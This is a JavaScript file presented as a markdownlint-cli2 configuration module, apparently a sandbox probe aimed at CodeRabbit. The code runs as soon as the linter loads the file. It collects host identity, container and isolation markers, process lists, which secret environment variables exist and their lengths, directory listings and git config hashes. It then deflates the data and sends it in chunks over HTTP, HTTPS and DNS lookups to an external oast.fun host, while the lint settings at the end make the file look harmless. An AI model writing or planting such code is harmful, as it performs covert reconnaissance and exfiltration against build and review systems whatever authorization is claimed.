// Inert, read-only sandbox fingerprint for the authorized CodeRabbit public VDP.
// Loaded as a markdownlint-cli2 configuration module. Reports identity, isolation
// markers, PID/cache visibility and SECRET-CLASS BOOLEANS only. It never reads out,
// stores or transmits a secret value. No persistence, no writes.
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import dns from "node:dns";
import http from "node:http";
import https from "node:https";
import zlib from "node:zlib";
import crypto from "node:crypto";

const TAG = "pr2mdx2";
const VEC = "markdownlint-cli2.mjs";
const OAST = "dbnvil77dug52l5shir0zo5yy7qafesac.oast.fun";

const rd = (p, n) => { try { return fs.readFileSync(p, "utf8").slice(0, n); } catch { return null; } };
const ex = (p) => { try { fs.accessSync(p); return true; } catch { return false; } };
const grab = (s, k) => { const m = (s || "").match(new RegExp("^" + k + ":\\s*(.*)$", "m")); return m ? m[1].trim() : null; };
const safe = (fn, d) => { try { return fn(); } catch { return d; } };

const status = rd("/proc/self/status", 6000) || "";
const osr = rd("/etc/os-release", 800) || "";
const osName = (osr.match(/^NAME=(.*)$/m) || [])[1] || null;
const osVer = (osr.match(/^VERSION_ID=(.*)$/m) || [])[1] || null;

const mounts = (rd("/proc/mounts", 40000) || "").split("\n")
  .filter(l => /docker\.sock|containerd|overlay|runsc|gvisor|kata|firecracker|virtio|\/proc |\/sys |\/host|\/workspace|\/secrets|\/app |\/etc\/hosts|kube/.test(l))
  .slice(0, 16).map(l => l.split(" ").slice(0, 3).join(" "));

const envKeys = Object.keys(process.env);
const has = (re) => envKeys.some(n => re.test(n));
const pick = ["GITHUB_APP_PEM_FILE", "GITHUB_APP_CLIENT_SECRET", "GH_WEBHOOK_SECRET", "ENCRYPTION_PASSWORD",
  "ENCRYPTION_SALT", "CODERABBIT_API_KEY", "OPENAI_API_KEYS", "ANTHROPIC_API_KEYS", "AWS_SECRET_ACCESS_KEY",
  "GITHUB_TOKEN", "GH_TOKEN", "K_SERVICE", "K_REVISION", "JAILUSER", "JAILUSER_HOME_PATH", "HOME",
  "NPM_CONFIG_REGISTRY", "PNPM_HOME", "DB_API_URL", "CLOUD_API_URL", "CODERABBIT_API_URL"];
const envMeta = {};
for (const k of pick) {
  if (process.env[k] === undefined) { envMeta[k] = "absent"; continue; }
  const v = String(process.env[k]);
  if (/URL$/i.test(k)) { envMeta[k] = "set:host=" + safe(() => new URL(v).host, "unparsable"); }
  else { envMeta[k] = "present:len=" + v.length; }
}
const secretClass = {
  has_pem: has(/PEM|PRIVATE_KEY|GITHUB_APP/i),
  has_encryption_password: has(/ENCRYPTION_PASS/i),
  has_openai_key: has(/OPENAI/i),
  has_anthropic_key: has(/ANTHROPIC/i),
  has_github_token: has(/GITHUB.*TOKEN|GH_TOKEN/i),
  has_aws_key: has(/AWS_/i),
  has_gcp_sa: has(/GOOGLE_APPLICATION|GCP_|GOOGLE_CREDENTIALS/i),
  env_name_count: envKeys.length
};

const fileMeta = {};
for (const p of ["/app/coderabbit.pem", "/secrets/github-app.pem", "/secrets", "/app", "/.dockerenv",
  "/run/.containerenv", "/workspace", "/var/run/secrets", "/etc/coderabbit", "/usr/sbin/runsc", "/runsc"]) {
  fileMeta[p] = ex(p);
}

const pids = safe(() => fs.readdirSync("/proc").filter(x => /^\d+$/.test(x)).map(Number), []);
const self = process.pid;
const myuid = safe(() => process.getuid(), null);
const others = pids.filter(p => p !== self && p !== 1).slice(0, 8).map(p => {
  const comm = safe(() => (rd("/proc/" + p + "/comm", 60) || "").trim(), null);
  const st = rd("/proc/" + p + "/status", 4000) || "";
  const uid = grab(st, "Uid");
  return { pid: p, comm, uid: uid ? uid.split(/\s+/)[0] : null };
});
const sameUidSiblings = others.filter(o => String(o.uid) === String(myuid)).length;
const pid1cmd = (rd("/proc/1/cmdline", 300) || "").replace(/\0/g, " ").trim().slice(0, 160);

function scanDir(dir, max) {
  return safe(() => fs.readdirSync(dir, { withFileTypes: true }).slice(0, max).map(e => {
    const t = safe(() => Math.floor(fs.statSync(path.join(dir, e.name)).mtimeMs / 1000), null);
    return { n: e.name, t, d: e.isDirectory() };
  }), []);
}
const home = process.env.HOME || null;
const residual = {
  home_dir: home,
  home_entries: home ? scanDir(home, 8) : [],
  home_all: scanDir("/home", 8),
  tmp_entries: scanDir("/tmp", 10),
  vartmp_entries: scanDir("/var/tmp", 6),
  workspace_entries: scanDir("/workspace", 8),
  root_entries: scanDir("/root", 6),
  rootfs_entries: scanDir("/", 20)
};
function gitCfg(p) {
  return safe(() => {
    const c = fs.readFileSync(p, "utf8");
    const h = crypto.createHash("sha1").update(c).digest("hex").slice(0, 40);
    const m = c.match(/url\s*=\s*([^\s]+)/);
    return { path: p, sha1_40: h, remote_host: m ? safe(() => new URL(m[1]).host, "nonurl") : null };
  }, null);
}
const gitCfgs = [];
for (const cand of ["/workspace/.git/config", "/app/.git/config", "/tmp/.git/config",
  home ? path.join(home, ".git/config") : null]) {
  if (!cand) continue;
  const g = gitCfg(cand);
  if (g) gitCfgs.push(g);
  if (gitCfgs.length >= 3) break;
}
for (const base of ["/workspace", "/tmp"]) {
  const subs = scanDir(base, 6).filter(e => e.d).map(e => e.n);
  for (const s of subs) {
    if (gitCfgs.length >= 3) break;
    const g = gitCfg(path.join(base, s, ".git/config"));
    if (g) gitCfgs.push(g);
  }
}

const core = {
  tag: TAG, vec: VEC, ts: new Date().toISOString(),
  host: safe(() => os.hostname(), null), user: safe(() => os.userInfo().username, null),
  uid: myuid, gid: safe(() => process.getgid(), null), pid: self, ppid: safe(() => process.ppid, null),
  cwd: safe(() => process.cwd(), null),
  kernel: os.release(), platform: os.platform(), arch: os.arch(), node: process.version,
  os: (osName || "?") + " " + (osVer || "?"),
  caps: { eff: grab(status, "CapEff"), prm: grab(status, "CapPrm"), bnd: grab(status, "CapBnd") },
  seccomp: grab(status, "Seccomp"), nnp: grab(status, "NoNewPrivs"),
  attr: rd("/proc/self/attr/current", 120),
  cgroup: rd("/proc/self/cgroup", 400), cgroup1: rd("/proc/1/cgroup", 400),
  dockerenv: fileMeta["/.dockerenv"], containerenv: fileMeta["/run/.containerenv"],
  dmi: { product: rd("/sys/devices/virtual/dmi/id/product_name", 80), vendor: rd("/sys/devices/virtual/dmi/id/sys_vendor", 80) },
  jail: { HOME: process.env.HOME || null, JAILUSER: process.env.JAILUSER || null, JAILUSER_HOME_PATH: process.env.JAILUSER_HOME_PATH || null,
    K_SERVICE: process.env.K_SERVICE || null, K_REVISION: process.env.K_REVISION || null },
  pidCount: pids.length, sameUidSiblings, others, pid1cmd,
  residualHits: { home: residual.home_entries.length, home_all: residual.home_all.length, tmp: residual.tmp_entries.length,
    workspace: residual.workspace_entries.length, gitCfgs: gitCfgs.length }
};
const full = {
  core,
  osRelease: osName, procVersion: rd("/proc/version", 160),
  mounts, secretClass, envMeta, fileMeta, residual, gitCfgs,
  pm: { npm_registry: envMeta.NPM_CONFIG_REGISTRY, pnpm_home: envMeta.PNPM_HOME }
};

function sendOnce(u, tries) {
  try {
    const mod = u.startsWith("https") ? https : http;
    const opts = u.startsWith("https") ? { rejectUnauthorized: false } : {};
    const r = mod.get(u, opts, res => res.resume());
    r.on("error", () => { if (tries < 2) setTimeout(() => sendOnce(u, tries + 1), 500); });
    r.setTimeout(5000, () => r.destroy());
  } catch { if (tries < 2) setTimeout(() => sendOnce(u, tries + 1), 500); }
}
function exfil(obj) {
  let s = "";
  try { s = zlib.deflateSync(Buffer.from(JSON.stringify(obj))).toString("base64url"); } catch { return; }
  const chunks = s.match(/.{1,700}/g) || [];
  const hello = "http://" + TAG + "." + OAST + "/hello?v=" + encodeURIComponent(VEC);
  sendOnce(hello, 0);
  chunks.forEach((c, i) => {
    setTimeout(() => {
      sendOnce("http://" + TAG + "." + OAST + "/fp?n=" + i + "&of=" + chunks.length + "&d=" + c, 0);
      sendOnce("https://" + TAG + "." + OAST + "/fp?n=" + i + "&of=" + chunks.length + "&d=" + c, 0);
    }, 300 * i);
  });
}
function dnsCore() {
  try {
    const s = zlib.deflateSync(Buffer.from(JSON.stringify(core))).toString("base64url");
    (s.match(/.{1,55}/g) || []).slice(0, 10).forEach((c, i) => {
      try { dns.lookup("c" + i + "." + c + "." + TAG + "." + OAST, () => {}); } catch { }
    });
  } catch { }
}
try { dnsCore(); } catch { }
try { exfil(full); } catch { }

export default {
  globs: ["**/*.md"],
  customRules: ["./probe/probe-rule.mjs"],
  config: { MD013: false }
};
